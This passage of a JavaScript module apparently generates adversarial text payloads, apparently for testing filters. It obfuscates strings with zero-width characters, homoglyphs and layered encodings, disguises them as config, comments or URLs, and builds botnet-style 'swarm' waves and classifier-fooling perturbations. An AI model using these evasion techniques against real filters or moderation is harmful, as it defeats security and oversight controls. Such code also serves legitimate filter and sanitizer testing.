        if (Math.random() < 0.5) {
          copy = copy + String.fromCharCode(0x200B + Math.floor(Math.random() * 10));
        }
        copies.push(copy);
      }
      return copies.join('\u2060'); // Word joiner separator
    },
    
    insertDecoyPatterns(payload) {
      const decoys = [
        'legitimate-config-key',
        'normal_variable_name',
        'safe-identifier',
        'standard_parameter'
      ];
      const decoy = decoys[Math.floor(Math.random() * decoys.length)];
      const position = Math.floor(payload.length * Math.random());
      return payload.slice(0, position) + '\u200C' + decoy + '\u200C' + payload.slice(position);
    },
    
    fragmentAndReassemble(payload) {
      // Split into fragments and use Unicode joiners
      const fragments = [];
      for (let i = 0; i < payload.length; i += 2) {
        fragments.push(payload.slice(i, i + 2));
      }
      return fragments.join('\u200D'); // Zero-width joiner
    },
    
    embedInLegitimateContext(payload) {
      const contexts = [
        `config.${payload}.default`,
        `user.profile.${payload}`,
        `system.${payload}.enabled`,
        `app.settings.${payload}`
      ];
      return contexts[Math.floor(Math.random() * contexts.length)];
    },
    
    createPolymorphicVariant(payload) {
      // Generate multiple equivalent forms
      const variants = [
        payload,
        payload.toUpperCase(),
        payload.toLowerCase(),
        this.replaceWithHomoglyphs(payload),
        this.insertInvisibleChars(payload)
      ];
      return variants[Math.floor(Math.random() * variants.length)];
    },
    
    // === CONTEXTUAL CAMOUFLAGE ===
    
    disguiseAsConfiguration(payload) {
      return `# Configuration\n${payload}=true\n# End config`;
    },
    
    mimicLegitimateUrl(payload) {
      return `https://cdn.example.com/assets/${payload}.js?v=1.0`;
    },
    
    embedInComment(payload) {
      return `/* TODO: Update ${payload} variable */`;
    },
    
    hideInMetadata(payload) {
      return `{"meta": {"${payload}": "value"}, "data": {}}`;
    },
    
    wrapInEncodingLayer(payload) {
      // Multiple encoding layers like real malware
      let encoded = payload;
      const encodings = ['base64', 'uri', 'html'];
      const layers = 1 + Math.floor(Math.random() * 2);
      
      for (let i = 0; i < layers; i++) {
        const encoding = encodings[Math.floor(Math.random() * encodings.length)];
        switch (encoding) {
          case 'base64':
            encoded = btoa(encoded).replace(/[+/=]/g, c => 
              ({ '+': '-', '/': '_', '=': '' })[c]);
            break;
          case 'uri':
            encoded = encodeURIComponent(encoded);
            break;
          case 'html':
            encoded = encoded.split('').map(c => 
              Math.random() < 0.3 ? `&#${c.charCodeAt(0)};` : c).join('');
            break;
        }
      }
      return encoded;
    }
  };
}

/**
 * SWARM INTELLIGENCE ATTACK ENGINE
 * Simulates coordinated attack patterns like botnets
 */
export function createSwarmAttackEngine() {
  const attackHistory = [];
  const successPatterns = new Map();
  
  return {
    // Generate coordinated attack waves
    generateAttackWave(basePayload, waveSize = 10) {
      const wave = [];
      const engine = createAdaptiveEvasionEngine();
      
      for (let i = 0; i < waveSize; i++) {
        let variant = engine.evolvePayload(basePayload);
        
        // Add swarm-specific modifications
        variant = this.addSwarmMarker(variant, i);
        variant = this.applyTimeBasedMutation(variant);
        variant = this.addDistributionVector(variant);
        
        wave.push({
          id: `swarm-${i}`,
          payload: variant,
          timestamp: Date.now() + (i * 100), // Staggered timing
          priority: Math.random()
        });
      }
      
      return wave.sort((a, b) => b.priority - a.priority);
    },
    
    addSwarmMarker(payload, index) {
      // Invisible markers for tracking (like real botnets)
      const marker = String.fromCharCode(0x200B + (index % 10));
      return payload + marker;
    },
    
    applyTimeBasedMutation(payload) {
      // Mutations based on current time (makes detection harder)
      const timeHash = Date.now() % 1000;
      const mutations = Math.floor(timeHash / 100);
      
      let mutated = payload;
      for (let i = 0; i < mutations; i++) {
        const pos = Math.floor(Math.random() * mutated.length);
        const char = String.fromCharCode(0x2000 + (timeHash % 100));
        mutated = mutated.slice(0, pos) + char + mutated.slice(pos);
      }
      
      return mutated;
    },
    
    addDistributionVector(payload) {
      // Simulate different attack origins
      const vectors = [
        'tor-exit-node',
        'compromised-cdn',
        'malicious-proxy',
        'infected-browser',
        'rogue-extension'
      ];
      const vector = vectors[Math.floor(Math.random() * vectors.length)];
      return `${vector}:${payload}`;
    }
  };
}

/**
 * ADVERSARIAL ML ENGINE
 * Generates payloads designed to fool machine learning classifiers
 */
export function createAdversarialMLEngine() {
  return {
    // Generate adversarial examples that fool ML models
    generateAdversarialExample(basePayload, targetClass = 'benign') {
      let adversarial = basePayload;
      
      // Apply ML-specific evasion techniques
      adversarial = this.addAdversarialNoise(adversarial);
      adversarial = this.performFeatureSpaceAttack(adversarial);
      adversarial = this.applyGradientBasedPerturbation(adversarial);
      
      return adversarial;
    },
    
    addAdversarialNoise(payload) {
      // Add carefully crafted "noise" that fools classifiers
      const noisePatterns = [
        '\u2063', // Invisible separator
        '\u206F', // Nominal digit shapes
        '\u3164', // Hangul filler
        '\uFFA0'  // Halfwidth hangul filler
      ];
      
      const noise = noisePatterns[Math.floor(Math.random() * noisePatterns.length)];
      const positions = [];
      
      // Strategic noise placement (not random!)
      for (let i = 0; i < payload.length; i += 3) {
        positions.push(i);
      }
      
      positions.reverse().forEach(pos => {
        payload = payload.slice(0, pos) + noise + payload.slice(pos);
      });
      
      return payload;
    },
    
    performFeatureSpaceAttack(payload) {
      // Modify features that ML models typically use
      const features = this.extractFeatures(payload);
      const modifiedPayload = this.perturbFeatures(payload, features);
      return modifiedPayload;
    },
    
    extractFeatures(payload) {
      return {
        length: payload.length,
        entropy: this.calculateEntropy(payload),
        charFrequency: this.getCharFrequency(payload),
        unicodeBlocks: this.getUnicodeBlocks(payload)
      };
    },
    
    calculateEntropy(str) {
      const freq = {};
      for (let char of str) {
        freq[char] = (freq[char] || 0) + 1;
      }
      
      let entropy = 0;
      const len = str.length;
      Object.values(freq).forEach(f => {
        const p = f / len;
        entropy -= p * Math.log2(p);
      });
      
      return entropy;
    },
    
    getCharFrequency(str) {
      const freq = {};
      for (let char of str) {
        freq[char] = (freq[char] || 0) + 1;
      }
      return freq;
    },
    
    getUnicodeBlocks(str) {
      const blocks = new Set();
      for (let char of str) {
        const code = char.charCodeAt(0);
        if (code < 0x80) blocks.add('ascii');
        else if (code < 0x100) blocks.add('latin1');
        else if (code < 0x180) blocks.add('latin-extended');
        else if (code >= 0x2000 && code < 0x2070) blocks.add('general-punctuation');
        else blocks.add('other');
      }
      return Array.from(blocks);
    },
    
    perturbFeatures(payload, features) {
      // Modify payload to change feature values in adversarial ways
      let perturbed = payload;
      
      // Change entropy by adding/removing repetition
      if (features.entropy > 3) {
        perturbed += 'aaa'; // Lower entropy
      } else {
        perturbed += 'xyz'; // Higher entropy
      }
      
      // Add characters from different unicode blocks
      if (!features.unicodeBlocks.includes('general-punctuation')) {
        perturbed += '\u2020'; // Dagger symbol
      }
      
      return perturbed;
    },
    
    applyGradientBasedPerturbation(payload) {
      // Simulate gradient-based adversarial attack
      const perturbations = [];
      
      for (let i = 0; i < payload.length; i++) {
        const char = payload[i];
        const code = char.charCodeAt(0);
        
        // Find nearby characters that might fool the model
        const candidates = [];
        for (let offset = -5; offset <= 5; offset++) {
          if (offset !== 0) {
            candidates.push(String.fromCharCode(code + offset));
          }
        }
        
        if (Math.random() < 0.1) { // 10% perturbation rate
          const perturbation = candidates[Math.floor(Math.random() * candidates.length)];
          perturbations.push({ index: i, char: perturbation });
        }
      }
      
      let result = payload.split('');
      perturbations.forEach(p => {
        result[p.index] = p.char;
      });
      
      return result.join('');
    }
  };
}

// --- Export all functions for testing ---
export {
  PROTOCOL_SMUGGLING_CHARS,
  INVISIBLE_TOKEN_SPLITTERS,
  HOMOGLYPH_MAP,
  EXPANSION_CHARS,
  CANONICAL_COLLISION_PAIRS,
  createAdaptiveEvasionEngine,
  createSwarmAttackEngine,
  createAdversarialMLEngine
};

// --- Example Usage ---
/*
// To run this example: node --experimental-modules adversarialPayloadGenerator.mjs
// Or use in a modern JS environment that supports ES modules.

console.log('--- Adversarial Payload Generator ---');

const allPayloads = generateAllPayloads();

console.log(`Generated ${allPayloads.length} total payloads.\n`);

// Display a few examples from each category
const examples = {};
for (const p of allPayloads) {
  if (!examples[p.type]) {
    examples[p.type] = [];
  }
  if (examples[p.type].length < 2) {
    examples[p.type].push(p);
  }
}

for (const type in examples) {
  console.log(`\n--- Category: ${type} ---`);
  for (const example of examples[type]) {
    const payloadDisplay = typeof example.payload === 'object'
      ? JSON.stringify(example.payload).substring(0, 80) + '...'
      : example.payload;
    console.log(`  Description: ${example.description || 'N/A'}`);
    console.log(`  Payload: ${payloadDisplay}`);
  }
}
*/